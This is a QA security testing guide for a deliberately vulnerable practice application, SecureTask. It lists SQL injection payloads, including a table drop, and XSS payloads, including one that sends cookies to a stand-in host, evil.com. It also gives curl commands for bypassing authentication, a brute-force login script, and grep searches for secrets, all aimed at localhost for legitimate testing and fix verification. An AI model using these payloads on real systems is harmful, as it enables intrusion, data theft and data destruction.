# QA Security Testing Guide

## 🎯 Your Mission

As **QA/Security Tester**, your task is to identify, document, and verify security vulnerabilities in the SecureTask application. You'll test both frontend and backend to find security flaws, then verify the fixes implemented by development teams.

---

## 📋 Testing Phases

### Phase 1: Discovery & Documentation (Week 1)
- Identify vulnerabilities
- Document reproduction steps
- Rate severity
- Create vulnerability report

### Phase 2: Test Case Development (Week 2)
- Create manual test cases
- Develop automated security tests
- Document expected vs actual behavior

### Phase 3: Fix Verification (Week 3)
- Verify each fix
- Re-test vulnerabilities
- Perform regression testing
- Final security assessment

---

## 🔍 Vulnerability Testing Checklist

### 1. SQL Injection Testing

**Target**: Search functionality

**Test Steps:**
1. Navigate to Dashboard
2. Use search box with malicious payloads

**Test Payloads:**
```sql
' OR '1'='1
' OR 1=1--
'; DROP TABLE tasks; --
' UNION SELECT * FROM users--
admin'--
' OR 'a'='a
```

**Expected Vulnerable Behavior:**
- Returns all tasks instead of filtered results
- Exposes database structure
- Shows error messages with SQL details

**Expected Secure Behavior:**
- Only returns matching results
- Handles special characters safely
- No SQL errors exposed to user

**How to Verify:**
```bash
# Test via API
curl "http://localhost:8080/api/tasks/search?q=' OR '1'='1"

# Should return only matching results after fix
```

**Documentation Template:**
```
Vulnerability: SQL Injection in Search
Severity: CRITICAL
Location: /api/tasks/search endpoint
Reproduction:
1. Go to dashboard
2. Enter: ' OR '1'='1 in search
3. Observe all tasks returned
Impact: Can read entire database, modify data
```

---

### 2. XSS (Cross-Site Scripting) Testing

**Target**: Task descriptions, user profiles

**Test Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert(document.cookie)>
<iframe src="javascript:alert('XSS')"></iframe>
<body onload=alert('XSS')>
<script>fetch('http://evil.com?cookie='+document.cookie)</script>
```

**Test Steps:**

**Test 1: Task Description XSS**
1. Login to application
2. Create new task
3. Title: "Test Task"
4. Description: `<script>alert('XSS')</script>`
5. Save and observe

**Test 2: Profile Bio XSS**
1. Go to Profile page
2. Update bio with: `<img src=x onerror=alert('XSS')>`
3. Save and refresh page
4. Observe if script executes

**Expected Vulnerable Behavior:**
- Alert box pops up
- JavaScript executes
- Can access localStorage/cookies

**Expected Secure Behavior:**
- HTML is escaped or sanitized
- Script tags displayed as text
- No JavaScript execution

**Documentation Template:**
```
Vulnerability: Stored XSS in Task Description
Severity: HIGH
Location: Dashboard task display
Reproduction:
1. Create task with description: <script>alert('XSS')</script>
2. View dashboard
3. Alert executes
Impact: Can steal tokens, perform actions as user
```

---

### 3. Authentication & Authorization Testing

**Test Cases:**

**Test 1: Access Without Authentication**
```bash
# Try accessing protected endpoints without login
curl http://localhost:8080/api/tasks
curl http://localhost:8080/api/users/me
curl -X DELETE http://localhost:8080/api/tasks/1
```

**Test 2: Authorization Bypass**
```bash
# Try accessing admin endpoint as regular user
# Login as regular user first, get token
TOKEN="<your-token>"
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/admin/users
```

**Test 3: Horizontal Privilege Escalation**
```bash
# Try updating another user's profile
# User ID 1 tries to update User ID 2
curl -X PUT http://localhost:8080/api/users/2/profile \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked"}'
```

**Test 4: Client-Side Authorization Bypass**
1. Login as regular user (user@example.com)
2. Open DevTools → Application → Local Storage
3. Find `user` object
4. Change `"role":"user"` to `"role":"admin"`
5. Navigate to `/admin`
6. Check if you can see admin panel

**Expected Vulnerable Behavior:**
- Can access endpoints without authentication
- Regular users can access admin functions
- Can modify other users' data
- Client-side role change grants access

**Expected Secure Behavior:**
- 401 Unauthorized for unauthenticated requests
- 403 Forbidden for unauthorized requests
- Can only modify own resources
- Server validates role, not client

**Documentation Template:**
```
Vulnerability: Missing Authentication on Delete Endpoint
Severity: CRITICAL
Location: DELETE /api/tasks/:id
Reproduction:
1. Logout from application
2. curl -X DELETE http://localhost:8080/api/tasks/1
3. Task is deleted without authentication
Impact: Anyone can delete any task
```

---

### 4. Insecure Data Storage Testing

**Test Steps:**

**Test 1: Check localStorage After Login**
1. Login to application
2. Open DevTools → Application → Local Storage
3. Check for sensitive data

**What to Look For:**
- JWT tokens in localStorage
- User passwords visible
- Session tokens
- API keys
- Any PII data

**Test 2: Check sessionStorage**
1. Check Application → Session Storage
2. Look for sensitive data

**Expected Vulnerable Behavior:**
- JWT token visible in localStorage
- User object contains password
- Sensitive data accessible via JavaScript

**Expected Secure Behavior:**
- JWT in httpOnly cookies (not accessible to JavaScript)
- No passwords in frontend storage
- Minimal data in localStorage

**Documentation:**
```
Vulnerability: JWT Token in localStorage
Severity: HIGH
Location: Login process stores token in localStorage
Reproduction:
1. Login to app
2. Check DevTools → Application → Local Storage
3. See 'token' key with JWT value
Impact: XSS can steal token and impersonate user
```

---

### 5. Hardcoded Credentials Testing

**Test Steps:**

**Test 1: Search Source Code**
```bash
# Search for hardcoded secrets
cd frontend
grep -r "password" src/
grep -r "secret" src/
grep -r "API_KEY" src/
grep -r "admin-key" src/
grep -r "aws" src/ -i

cd ../backend
grep -r "password" .
grep -r "secret" .
grep -r "taskpass" .
```

**Test 2: Check Browser DevTools**
1. Open application
2. DevTools → Sources → Check all JavaScript files
3. Look for hardcoded credentials

**Test 3: Review Git History**
```bash
# Check if secrets were committed
git log --all --full-history --source -- **/.env
```

**Expected Vulnerable Behavior:**
- Find API keys in config.js
- Database passwords in source code
- JWT secrets hardcoded
- .env file in Git repository

**Expected Secure Behavior:**
- No secrets in source code
- Environment variables used
- .env in .gitignore
- Secrets properly managed

**Documentation:**
```
Vulnerability: Hardcoded API Key
Severity: HIGH
Location: frontend/src/config.js
Details: ADMIN_API_KEY = 'admin-key-12345'
Impact: Anyone can access admin API functions
```

---

### 6. Brute Force Testing

**Test**: Login endpoint rate limiting

**Test Steps:**
1. Write a script to attempt multiple logins
2. Try 100 login attempts in 1 minute
3. Check if account locks or requests blocked

**Test Script:**
```bash
#!/bin/bash
for i in {1..100}; do
  curl -X POST http://localhost:8080/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"user@example.com","password":"wrong"}' &
done
wait
```

**Expected Vulnerable Behavior:**
- All requests processed
- No rate limiting
- Can attempt unlimited logins

**Expected Secure Behavior:**
- Requests throttled after N attempts
- Account temporarily locked
- CAPTCHA required

---

## 🛠️ Testing Tools

### Manual Testing Tools
- **Browser DevTools**: Check localStorage, network requests, console
- **Postman**: API testing
- **cURL**: Command-line HTTP testing

### Security Testing Tools
- **Burp Suite Community**: Intercept and modify requests
- **OWASP ZAP**: Automated security scanning
- **SQLMap**: Automated SQL injection testing

### Browser Extensions
- **EditThisCookie**: Modify cookies
- **Wappalyzer**: Identify technologies
- **ModHeader**: Modify request headers

---

## 📊 Vulnerability Severity Rating

### Critical
- SQL Injection allowing data theft
- Authentication bypass
- Remote code execution

### High
- XSS allowing token theft
- Privilege escalation
- Hardcoded credentials in code

### Medium
- Missing rate limiting
- Information disclosure
- Weak password requirements

### Low
- Verbose error messages
- Missing security headers
- Debug information visible

---

## 📝 Reporting Template

Use the template in `qa/vulnerability-report-template.md`:

```markdown
# Security Vulnerability Report

## Vulnerability Details
**Title**: [Short description]
**Severity**: [Critical/High/Medium/Low]
**Category**: [SQL Injection/XSS/Auth/etc]
**Status**: [Open/In Progress/Fixed/Verified]

## Location
**Component**: [Frontend/Backend/API]
**File**: [Path to file]
**Endpoint**: [If applicable]

## Description
[Detailed description of the vulnerability]

## Reproduction Steps
1. Step one
2. Step two
3. Step three

## Expected Behavior
[What should happen]

## Actual Behavior
[What actually happens]

## Impact
[What an attacker could do]

## Evidence
[Screenshots, logs, curl commands]

## Recommendation
[How to fix - but don't give exact code]

## References
[OWASP links, CVE numbers, etc]
```

---

## ✅ Fix Verification Checklist

After developers implement fixes, verify:

### SQL Injection
- [ ] Search with `' OR '1'='1` returns no results or only matching
- [ ] Special characters handled safely
- [ ] No SQL errors exposed
- [ ] Test with SQLMap shows no vulnerabilities

### XSS
- [ ] Script tags in task description don't execute
- [ ] Profile bio with XSS payload shows as text
- [ ] Browser console shows no XSS attempts
- [ ] DOMPurify or similar sanitization confirmed

### Authentication
- [ ] All protected endpoints return 401 without auth
- [ ] Cannot delete tasks without authentication
- [ ] Cannot access /api/admin/* without auth

### Authorization
- [ ] Admin endpoints check role server-side
- [ ] Cannot update other users' profiles
- [ ] Client-side role modification doesn't grant access

### Secure Storage
- [ ] JWT token NOT in localStorage
- [ ] Passwords NOT stored in frontend
- [ ] Check with: `localStorage.getItem('token')` returns null

### Hardcoded Secrets
- [ ] No API keys in source code
- [ ] Secrets in environment variables
- [ ] .env file in .gitignore
- [ ] No secrets in Git history

---

## 🤝 Collaboration Points

### With Backend Team
- Share API testing results
- Discuss authentication flow
- Report server-side vulnerabilities
- Verify fixes together

### With Frontend Team
- Share XSS test results
- Demonstrate localStorage issues
- Test client-side fixes
- Verify UI security measures

### Cross-Team
- Coordinate fix verification
- Share security test scripts
- Document security improvements
- Final security sign-off

---

## 🏆 Success Criteria

QA sign-off when:

1. ✅ All CRITICAL vulnerabilities fixed and verified
2. ✅ All HIGH vulnerabilities fixed and verified
3. ✅ Medium/Low vulnerabilities documented (fix or accept risk)
4. ✅ Regression tests pass
5. ✅ Security test suite created
6. ✅ Comprehensive vulnerability report delivered
7. ✅ No new vulnerabilities introduced by fixes
8. ✅ Application meets security standards

---

## 📚 Additional Resources

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Web Security Academy: https://portswigger.net/web-security
- SQL Injection Cheat Sheet
- XSS Filter Evasion Cheat Sheet

---

**Remember**: Your role is critical! Thorough testing ensures the application is secure before going to production. Document everything, be systematic, and work closely with development teams.
